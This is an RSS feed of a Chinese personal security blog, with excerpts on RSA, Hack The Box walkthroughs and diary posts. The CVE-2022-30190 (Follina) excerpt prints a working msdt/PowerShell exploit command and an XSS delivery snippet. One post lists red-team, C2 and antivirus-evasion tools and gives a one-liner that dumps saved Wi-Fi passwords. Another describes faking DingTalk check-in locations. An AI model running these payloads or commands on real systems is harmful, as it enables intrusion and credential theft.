<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>dayu&#39;s blog</title>
    <link>https://killdayu.com/</link>
    <description>Recent content on dayu&#39;s blog</description>
    <image>
      <url>https://killdayu.com/papermod-cover.png</url>
      <link>https://killdayu.com/papermod-cover.png</link>
    </image>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Tue, 12 Jul 2022 13:48:27 +0800</lastBuildDate><atom:link href="https://killdayu.com/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>RSA算法</title>
      <link>https://killdayu.com/posts/rsa%E7%AE%97%E6%B3%95/</link>
      <pubDate>Tue, 12 Jul 2022 13:48:27 +0800</pubDate>
      
      <guid>https://killdayu.com/posts/rsa%E7%AE%97%E6%B3%95/</guid>
      <description>简介 RSA算法是一种非对称算法，即公钥和密钥不相同，本质是利用2个大素数的乘积难以做因素分解。
算法 RSA算法的密钥由3个数构成N，d，e
N由2个互不相同的素数的乘积构成 $$ N=pq $$
根据欧拉函数，求得r，即小于N且与N互质的数的个数。 $$ {\displaystyle r=\varphi (N)=(p-1)(q-1)} $$
选择其中的一个质数为e，找到一个数 d。 $$ ed \bmod r=1 $$
现在N，d，e都已经拿到了，公钥是(N, e)，私钥是(N, d)。那么N和e就是公开的，而d是保密的。
测试 然后就能使用公钥加密数据，然后私钥解密数据了。
首先我们先选2个素数来算出N，我这里选择了3和5，那么N = 3 x 5 = 15
那么r = (3 - 1) x (5 - 1) = 8，即15以内有8个数与它互质，他们分别是1，2，4，7，8，11，13，14。其中质数有2，7，11，13。
这里选择11为e，根据(d x 11) % 8 = 1，求出d = 3
d = 0 e = 11 r = 8 while(1): if ((d * e) % r == 1): print(d)	//3 break d = d + 1 那么现在N = 15，e = 11，d = 3，公钥为(15, 11)，私钥为(15, 3)。</description>
    </item>
    
    <item>
      <title>CVE_2022_30190_MSDT_RCE</title>
      <link>https://killdayu.com/posts/cve_2022_30190_msdt_rce/</link>
      <pubDate>Sat, 25 Jun 2022 18:45:36 +0800</pubDate>
      
      <guid>https://killdayu.com/posts/cve_2022_30190_msdt_rce/</guid>
      <description>CVE-2022-30190 虽迟但到
刚起床，然后有事，就看了下这个洞，几天前就看见过这个洞了，但是我是个废物就懒的弄。
漏洞原理 首先说一下自己对这个洞的理解，这个洞的本质就是msdt过滤的问题，导致msdt协议可以执行powershell代码。
但是这个洞为什么个Office能关联上呢？
因为Office在打开docx的时候可以加载一个web网页，然后web网页就能调用msdt协议，问题的关键就在于旧版本的Office在调用msdt协议的时候默认同意，而新版本则不同意，然后msdt绕过过滤就能执行powershell了。旧版本的Office应该是2013到2021 ltsc以下的，我用的2016复现成功，2021 pro plus则不行。
其实也不需要配合Office，浏览器就行，只不过需要手动点一下同意调用，这里可以直接利用xss，嘿嘿嘿。
漏洞代码 https://paper.seebug.org/1913/
Exp:
C:\Windows\system32\msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param &amp;#34;IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=fff$(IEX(&amp;#39;mspaint.exe&amp;#39;))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe &amp;#34; 一看这个exp就是为了绕过某种限制。
$appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace(&amp;#34;$&amp;#34;, &amp;#34;$&amp;#34;)	//没修复的 $appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace(&amp;#34;`$&amp;#34;, &amp;#34;``$&amp;#34;)	//修复过的 可以利用github这个项目快速生成一个exp word文件
https://github.com/komomon/CVE-2022-30190-follina-Office-MSDT-Fixed
漏洞测试 直接cmd运行一下这个
C:\Windows\system32\msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param &amp;#34;IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=fff$(IEX(&amp;#39;mspaint.exe&amp;#39;))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe &amp;#34; 如果能弹出画图就成功了，不能就是狗拦了或者系统打补丁了，Office也更不可能利用成功。
Office测试
如果打开的时候有请求记录但是没弹出计算器那就是Office版本问题（cmd能执行成功的情况下）。
OK
漏洞环境 Office：2013-2021ltsc（大概是）
Windows：卸载6月补丁，忘记kb号了，自己看看吧。关闭Defender，或者回退旧版本。
差不多就这样。
一些发现 可以直接配合xss，点击即上线。
&amp;lt;script&amp;gt; location.href = &amp;#34;ms-msdt:/id PCWDiagnostic /skip force /param \&amp;#34;IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=fff$(IEX(&amp;#39;mspaint.</description>
    </item>
    
    <item>
      <title>HTB_Timelapse</title>
      <link>https://killdayu.com/posts/htb_timelapse/</link>
      <pubDate>Tue, 14 Jun 2022 14:46:56 +0800</pubDate>
      
      <guid>https://killdayu.com/posts/htb_timelapse/</guid>
      <description>其实昨天就写得差不多了，处理了点细节，今天又是下午2点才起床，明明我昨晚3点就睡了的，草。
这篇文章不小心误删了，吓尿了。
这是一个windows内网环境的一个靶机
# Nmap 7.92 scan initiated Fri Apr 1 17:28:39 2022 as: nmap -sVC -p- -T4 -v -oN nmap/timelapse timelapse.htb Nmap scan report for timelapse.htb (10.10.11.152) Host is up (0.037s latency). Not shown: 65517 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-04-01 18:30:18Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.</description>
    </item>
    
    <item>
      <title>HTB_Paper</title>
      <link>https://killdayu.com/posts/htb_paper/</link>
      <pubDate>Mon, 13 Jun 2022 12:35:46 +0800</pubDate>
      
      <guid>https://killdayu.com/posts/htb_paper/</guid>
      <description>第一次玩htb，感觉还不错。
https://www.hackthebox.com/
1.准备工作 配一下openvpn mac，windows
可以直接用客户端打开
linux
sudo openvpn lab_lker.ovpn 2.user.txt 网上教程很多，就不细说了。
┌──(kali㉿kali)-[~/kali] └─$ nmap -sV 10.10.11.143 1 ⚙ Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-13 01:23 EDT Nmap scan report for office.paper (10.10.11.143) Host is up (0.23s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) 80/tcp open http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) 443/tcp open ssl/http Apache httpd 2.</description>
    </item>
    
    <item>
      <title>2022.6.10</title>
      <link>https://killdayu.com/posts/2022.6.10/</link>
      <pubDate>Fri, 10 Jun 2022 12:37:22 +0800</pubDate>
      
      <guid>https://killdayu.com/posts/2022.6.10/</guid>
      <description>梦 昨晚10点睡到早上十点，做了一个超长的梦，被tm一个贩毒集团的一直追杀，梦里差点被吓死。
Github 起床惯例，刷GitHub
提权，Linux
https://github.com/tr3ee/CVE-2022-23222 此漏洞影响Linux Kernel 5.8 - 5.16，并在5.10.92 / 5.15.15 / 5.16.1中修复。 https://github.com/RicterZ/CVE-2021-3560-Authentication-Agent polkit 0.113引入 取证，微信解密
https://github.com/x1hy9/WeChatUserDB https://www.52pojie.cn/thread-1084703-1-1.html https://github.com/Mr0x01/WXDBDecrypt.NET IPFS
https://ipfs.io/ 去中心化文件系统，可匿名发布信息和文件 漏洞库
https://github.com/Threekiii/Vulnerability-Wiki Windows c2
https://github.com/MythicAgents/Apollo Microsoft Office Word 远程执行代码
https://github.com/lockedbyte/CVE-2021-40444 python实现的反向shell
https://github.com/t0thkr1s/revshellgen 感觉没啥用，推荐 https://github.com/WangYihang/Platypus 交互式shell /usr/bin/script -qc /bin/bash go web框架
https://github.com/flamego/flamego 域名预测
https://github.com/LandGrey/domainNamePredictor 红队知识仓库 *
https://github.com/Threekiii/Awesome-Redteam https://github.com/pen4uin/awesome-pentest-note http://wiki.tidesec.com/ https://github.com/guchangan1/All-Defense-Tool 免杀
https://github.com/Threekiii/Awesome-Redteam/blob/master/tips/内网渗透-免杀.md https://github.com/TideSec/BypassAntiVirus tips
https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/攻防渗透常用命令速查.md exp
https://github.com/Threekiii/Awesome-Exploit c2服务器流量隐匿
https://github.com/wikiZ/RedGuard tip
powershell history %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt wifi password for /f &amp;#34;skip=9 tokens=1,2 delims=:&amp;#34; %i in (&amp;#39;netsh wlan show profiles&amp;#39;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear Ctf tools</description>
    </item>
    
    <item>
      <title>Dingtalk_Location</title>
      <link>https://killdayu.com/posts/dingtalk_location/</link>
      <pubDate>Mon, 06 Jun 2022 12:53:21 +0800</pubDate>
      
      <guid>https://killdayu.com/posts/dingtalk_location/</guid>
      <description>钉钉+某助手配合某框架的通用化在没root的手机上实现远程打卡😋（之前都没想到弄），这样我就不用每天9点起床手动帮别人打卡了。还能配合gayhub上开源的auto. js某脚本实现自动打卡。</description>
    </item>
    
    <item>
      <title>Supercookie</title>
      <link>https://killdayu.com/posts/supercookie/</link>
      <pubDate>Mon, 06 Jun 2022 12:49:21 +0800</pubDate>
      
      <guid>https://killdayu.com/posts/supercookie/</guid>
      <description>我草这个有点🐮，Google翻译看着有点头疼，原理大概就是浏览器会缓存网站的favicon.ico，然后缓存到的favicon.ico再次刷新网页的时候不会重新请求。服务器会在首次访问时创建多个路由（这样才能实现区分多个不同客户端），然后随机将一些路由的favicon.ico设置成200，同时按照路由的favicon.ico生成一个id。客户端再次刷新时由于缓存了某些路由之前的favicon.ico，就只会去请求之前404的favicon.ico，服务器就能得到404的favicon.ico请求然后还原出客户端的id。相当于实现了一个cookie，其实id的实习都源于浏览器的请求，所以代理这些网络层面的都隐藏不了。但是我试了下最新的Chrome失效了😋。但是貌似之前的Firefox中招了，Tor就是魔改的Firefox，也不知道有没有继承缓存favicon.ico这个特性😋，暗网不再暗网😋。一切特征都是supercookie😋。 https://github.com/jonasstrehle/supercookie https://supercookie.me/workwise</description>
    </item>
    
    <item>
      <title>2022.6.3</title>
      <link>https://killdayu.com/posts/2022.6.3/</link>
      <pubDate>Fri, 03 Jun 2022 19:10:33 +0800</pubDate>
      
      <guid>https://killdayu.com/posts/2022.6.3/</guid>
      <description>好久不见，冒个泡，我只是废物。</description>
    </item>
    
    <item>
      <title>2022.5.13</title>
      <link>https://killdayu.com/posts/2022.5.13/</link>
      <pubDate>Fri, 13 May 2022 16:45:37 +0800</pubDate>
      
      <guid>https://killdayu.com/posts/2022.5.13/</guid>
      <description>今早6点多才睡，因为手机快没电了。下午竟然1点多就醒了，然后看了下社区微信群，今天核酸下午4点就停了，之前明明是晚上9点，然后下午5点。。。。然后就不想去了，躺在床上纠结到了3点半，唉还是去吧，不然搞弹窗了又是一堆事，影响我周末躺平。测了下app的抓包，貌似发现了新的tips。凌晨刷知乎刷到了绝命毒师，感觉还不错，今晚开始刷剧。。。</description>
    </item>
    
    <item>
      <title>Hello_World</title>
      <link>https://killdayu.com/posts/hello_world/</link>
      <pubDate>Thu, 12 May 2022 19:44:56 +0800</pubDate>
      
      <guid>https://killdayu.com/posts/hello_world/</guid>
      <description>print(&amp;#34;Hello World!&amp;#34;) </description>
    </item>
    
    
    
  </channel>
</rss>
